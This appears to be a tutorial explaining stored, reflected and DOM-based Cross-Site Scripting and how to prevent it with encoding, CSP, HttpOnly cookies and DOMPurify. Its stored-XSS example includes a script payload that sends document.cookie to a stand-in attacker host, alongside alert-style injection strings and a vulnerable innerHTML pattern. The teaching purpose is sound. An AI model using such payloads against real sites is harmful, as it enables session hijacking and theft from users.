**Cross-Site Scripting (XSS)** is a security vulnerability where an attacker injects malicious client-side scripts (usually
JavaScript) into a web page viewed by other users.

While **CSRF** (which we discussed earlier) tricks a user into _performing an action_, **XSS** is about _stealing
information_ or _controlling the user's interaction_ with the site by executing code directly in their browser.

---

## How an XSS Attack Works

The core of an XSS attack is a failure to properly **sanitize** user input. The browser cannot distinguish between the
legitimate code of the website and the malicious code injected by an attacker; it simply executes all JavaScript it finds.

### The General Workflow:

1.  **Injection:** The attacker finds a way to put a string like `<script>alert('Hacked')</script>` into a website's database
    or URL.
2.  **Execution:** A victim visits the page. The server sends the malicious script to the victim's browser as part of the
    HTML.
3.  **The Payload:** The browser executes the script. This script can then steal session cookies, capture keystrokes, or
    redirect the user.

---

## The Three Main Types of XSS

### 1. Stored XSS (Persistent)

This is the most dangerous type. The malicious script is permanently stored on the target server (e.g., in a database, a
comment field, or a user profile).

- **Example:** An attacker posts a comment on a blog containing
  `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`.
- **The Result:** Every single person who views that comment will have their session cookie sent to the attacker.

### 2. Reflected XSS (Non-Persistent)

The script is "reflected" off the web server to the victim. It is usually delivered via a link where the script is embedded
in a URL parameter.

- **Example:** A search page displays the search term: `https://example.com/search?q=laptops`.
- **The Attack:** The attacker sends a link: `https://example.com/search?q=<script>/*malicious code*/</script>`.
- **The Result:** If the server prints "You searched for [q]" back to the page without escaping it, the script runs.

### 3. DOM-based XSS

The entire attack happens in the browser (the client-side). The server is never even aware of the malicious script. The
vulnerability exists in the original client-side JavaScript of the page that processes data from an untrusted source (like
the URL fragment `#`).

- **Example:** A script on the page takes the user's name from the URL to greet them:
  `document.getElementById('welcome').innerHTML = window.location.hash;`.
- **The Attack:** `https://example.com/#<img src=x onerror=alert(1)>`.

---

## What can an attacker do with XSS?

If an attacker can run JavaScript in your browser, they effectively **own your session**:

- **Cookie Theft:** Stealing `document.cookie` to hijack your login session.
- **Keylogging:** Recording everything you type (passwords, credit card numbers).
- **Phishing:** Changing the page content to show a fake login form that looks identical to the real site.
- **Bypass CSRF Protections:** As we noted before, XSS can read CSRF tokens, making it the "ultimate" weapon to bypass other
  security layers.

---

## How to Prevent XSS

### 1. Data Escaping/Encoding (The Best Defense)

Before rendering user-supplied data in HTML, you must encode it so the browser treats it as **text**, not **code**.

- **Bad:** `<div> ${userInput} </div>`
- **Good:** Convert `<` to `&lt;` and `>` to `&gt;`. React does this **automatically** for strings in JSX, which is why React
  is considered safer by default.

### 2. Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which sources of scripts are trusted.

- **Example:** `Content-Security-Policy: script-src 'self' https://trusted.com;`
- This prevents the browser from executing any "inline" scripts or scripts from unknown domains, effectively killing most XSS
  attacks even if an injection occurs.

### 3. Use `HttpOnly` Cookies

If you set your session cookies with the `HttpOnly` flag, JavaScript (`document.cookie`) cannot read them. This doesn't stop
the XSS attack, but it prevents the attacker from stealing your session.

### 4. Sanitize HTML

If your app _must_ allow users to post HTML (like a rich text editor), use a library like **DOMPurify** to strip out
dangerous tags (`<script>`, `<iframe>`) and attributes (`onerror`, `onload`).

```javascript
import DOMPurify from "dompurify";
const cleanHTML = DOMPurify.sanitize(dirtyHTMLFromUser);
```
